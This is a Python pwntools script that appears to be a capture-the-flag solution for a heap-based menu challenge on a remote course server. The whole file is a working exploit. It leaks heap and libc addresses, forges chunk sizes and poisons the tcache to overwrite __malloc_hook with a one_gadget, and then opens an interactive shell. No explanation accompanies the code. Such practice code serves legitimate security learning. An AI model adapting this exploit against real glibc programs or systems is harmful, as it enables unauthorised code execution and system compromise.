#!/usr/bin/env python3

from pwn import *

HOST = args.HOST if args.HOST else "6447.lol"
PORT = args.PORT if args.PORT else 8004

context.arch = "amd64"
context.log_level = 'info'

gdbscript = '''
continue
'''.format(**locals())

######################################
######## Establish Connection ########
######################################

def connect_binary():
    global P, E, LIBC
    
    with context.local(log_level='error'):
        if args.REMOTE:
            P = remote(HOST, PORT)
        elif args.GDB:
            P = gdb.debug([f"{__file__.replace('_sol.py', '')}"], gdbscript=gdbscript)
        else:
            P = process(f"{__file__.replace('_sol.py', '')}")

    E = ELF(f"{__file__.replace('_sol.py', '')}")
    LIBC = ELF('/lib/x86_64-linux-gnu/libc.so.6')

######################################
############## Exploit ###############
######################################

def create():
    P.recvuntil(b"): ", drop=True)
    P.sendline(b'c')

def delete(id):
    P.recvuntil(b"): ", drop=True)
    P.sendline(b'd')
    P.recvuntil(b"id: ", drop=True)
    P.sendline(id)

def set(id, input):
    P.recvuntil(b"): ", drop=True)
    P.sendline(b's')
    P.recvuntil(b"id: ", drop=True)
    P.sendline(id)
    P.recvuntil(b"question: ", drop=True)
    P.sendline(input)

def ask(id):
    P.recvuntil(b"): ", drop=True)
    P.sendline(b'a')
    P.recvuntil(b"id: ", drop=True)
    P.sendline(id)
    P.recvuntil(b"answer perhaps: '")
    answer = u64(P.recvuntil(b"'", drop=True).ljust(8, b'\x00'))
    return answer

def exploit():
    for _ in range(16 + 5):
        create()
    for i in range(5):
        delete(f'{16 + i}'.encode())
    delete(b'20')
    create() # 21
    heap_address = ask(b'21')
    log.info(f'Leaked Heap Address @ {hex(heap_address)}')
    set(b'2', b'A' * 40 + p64(0x421))
    delete(b'3')
    set(b'15', b'A' * 40 + p64(0x31) + p64(heap_address - 0x5d0))
    for _ in range(3):
        create()
    libc_leak = ask(b'24')
    log.info(f'Leaked LIBC Address @ {hex(libc_leak)}')
    LIBC.address = libc_leak - 0x1ecbe0
    one_gadget = LIBC.address + 0xe3b01
    delete(b'1')
    set(b'0', b'A' * 40 + p64(0x31) + p64(LIBC.symbols['__malloc_hook']))
    create() # 25
    set(b'25', p64(one_gadget))
    create()

    P.interactive()

if __name__ == '__main__':
    connect_binary()
    exploit()
